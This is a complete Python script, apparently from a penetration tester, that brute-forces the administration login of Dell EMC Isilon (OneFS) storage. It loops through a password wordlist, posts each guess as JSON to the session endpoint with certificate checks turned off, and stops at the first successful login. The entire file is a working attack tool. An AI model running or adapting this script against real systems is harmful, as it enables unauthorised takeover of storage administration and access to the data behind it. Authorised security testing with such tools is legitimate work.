#!/usr/bin/env python3
#
# Script name       : isilon-onefs-brute.py
# Version           : 1.0
# Created date      : 9/19/18
# Last update       : 9/19/18
# Author            : Milton Valencia (wetw0rk)
# Python version    : 3.5
# Designed OS       : Linux (preferably a penetration testing distro)
#
# Description :
#   This script will attempt to bruteforce DELL EMC Isilon
#   aka OneFS Storage Administration.
#

import sys
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def login_attempt(target_url, user, passwd):
    cookies = \
    {
        'isicsrf': 'wetw0rk',
        'flash'  : '1',
    }

    headers = \
    {
        'Host'             : '%s:%s' % (target_url.split(":")[1].lstrip('//'), target_url.split(":")[2]),
        'User-Agent'       : 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept'           : '*/*',
        'Accept-Language'  : 'en-US,en;q=0.5',
        'Accept-Encoding'  : 'gzip, deflate',
        'Referer'          : '%s/' % (target_url),
        'Content-Type'     : 'application/json',
        'X-Requested-With' : 'XMLHttpRequest',
        'Content-Length'   : '97',
        'Connection'       : 'close',
    }

    params = \
    (
        ('_dc', 'plomo_no_opcion_de_plata'),
    )

    data = '{"username":"%s","password":"%s","services":["platform","namespace","WK","remote-service"]}' % (user, passwd)

    s = requests.Session()
    response = s.post( # requests.post(
        '%s/session/1/session' % (target_url),
        headers=headers,
        params=params,
        cookies=cookies,
        data=data,
        verify=False
    )
    
    return response

def read_dictionary(filename):
    password_attempts = []
    wordlist = open(filename)
    words = wordlist.readlines()

    for i in words:
        password_attempts += i.rstrip(),

    return password_attempts

def main():

    try:
        rhost = str(sys.argv[1])
        user  = sys.argv[2]
        passl = sys.argv[3]
    except:
        print("Usage: ./%s <rhost> <username> <passwordlist>" % sys.argv[0])
        print("Example: ./%s https://192.168.245.3:8080 admin dic.txt" % sys.argv[0])
        sys.exit(1)

    try:
        attempts = read_dictionary(passl)
    except:
        print("\033[1m\033[91m[-]\033[0m error reading file")
        exit(-1)

    for i in range(len(attempts)):
        get_login_resp = login_attempt(rhost, user, attempts[i])
        if get_login_resp.text == '{"message":"Username or password is incorrect."}\n':
            print("\033[1m\033[91m[-]\033[0m login %s:%s failed" % (user, attempts[i]))
        else:
            print("\033[1m\033[92m[+]\033[0m login %s:%s successful" % (user, attempts[i]))
            sys.exit(0)
main()
